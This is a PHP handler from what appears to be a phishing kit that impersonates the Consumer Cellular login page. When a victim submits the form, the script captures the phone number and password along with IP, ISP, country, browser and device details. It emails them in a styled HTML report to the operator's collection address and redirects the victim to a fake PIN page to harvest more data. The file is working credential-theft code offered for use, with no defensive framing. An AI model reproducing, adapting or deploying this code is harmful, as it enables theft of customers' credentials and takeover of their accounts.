<?php
require_once __DIR__ . '/../[KARMA]/core/rules.php';
require_once __DIR__ . '/../[KARMA]/core/functions.php';
$config = require __DIR__ . '/../[KARMA]/config/config.php';

$info = get_ip_info();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$browser = get_browser_name($user_agent);
$device = get_device_type($user_agent);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['karma-phone'] = $_POST['karma-phone'] ?? '';
    $_SESSION['karma-password'] = $_POST['karma-password'] ?? '';
    $data = [
        'phone' => $_POST['karma-phone'] ?? '',
        'password' => $_POST['karma-password'] ?? '',
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'time' => date('Y-m-d H:i:s'),
    ];
    $to = $config['email_result'];
    $subject = $data['phone'] . ' # [ ' . $info['country'] . ' - ' . $info['ip'] . ' ]';
    $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; max-width: 540px; margin: 32px auto; background: #fff; border-radius: 18px; box-shadow: 0 4px 24px #0002; padding: 32px 28px;">'
        .'<h2 style="color:#f26631; font-size: 1.6rem; margin-bottom: 18px; letter-spacing: 0.5px;"># Consumer Cellular Login #</h2>'
        .'<table style="width:100%; font-size: 1rem; color: #222; border-collapse: collapse;">'
        .'<tr><td style="padding:8px 0;width:160px;color:#888;">Phone</td><td style="padding:8px 0;">' . htmlspecialchars($data['phone']) . '</td></tr>'
        .'<tr><td style="padding:8px 0;color:#888;">Password</td><td style="padding:8px 0;">' . htmlspecialchars($data['password']) . '</td></tr>'
        .'</table>'
        .'<hr style="margin:28px 0 18px 0; border:0; border-top:1.5px solid #eee;">'
        .'<h3 style="color:#f26631; font-size: 1.1rem; margin-bottom: 10px; letter-spacing: 0.2px;"># Device Info #</h3>'
        .'<table style="width:100%; font-size: 0.98rem; color: #222; border-collapse: collapse;">'
        .'<tr><td style="padding:7px 0;width:160px;color:#888;">Device</td><td style="padding:7px 0;">' . htmlspecialchars($device) . '</td></tr>'
        .'<tr><td style="padding:7px 0;width:160px;color:#888;">Browser</td><td style="padding:7px 0;">' . htmlspecialchars($browser) . '</td></tr>'
        .'<tr><td style="padding:7px 0;width:160px;color:#888;">IP Address</td><td style="padding:7px 0;">' . htmlspecialchars($info['ip'] ?? '') . '</td></tr>'
        .'<tr><td style="padding:7px 0;width:160px;color:#888;">ISP</td><td style="padding:7px 0;">' . htmlspecialchars($info['isp'] ?? '') . '</td></tr>'
        .'<tr><td style="padding:7px 0;width:160px;color:#888;">Country</td><td style="padding:7px 0;">' . htmlspecialchars($info['country'] ?? '') . '</td></tr>'
        .'<tr><td style="padding:7px 0;color:#888;">User Agent</td><td style="padding:7px 0;word-break:break-all;">' . htmlspecialchars($data['user_agent']) . '</td></tr>'
        .'<tr><td style="padding:7px 0;color:#888;">Time</td><td style="padding:7px 0;">' . htmlspecialchars($data['time']) . '</td></tr>'
        .'</table>'
        .'</div>';
    $message = wordwrap($message, 998, "\r\n");
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
    $headers .= "From: Consumer Cellular - LOGIN <karma@server.smh>\r\n";
    mail($to, $subject, $message, $headers);
    log_event('LOGIN RECEIVED');
    header('Location: /consumercellular.com/pin');
    exit;
} else {
    http_response_code(405);
    header('Location: ' . $config['redirect_bots']);
    exit;
}
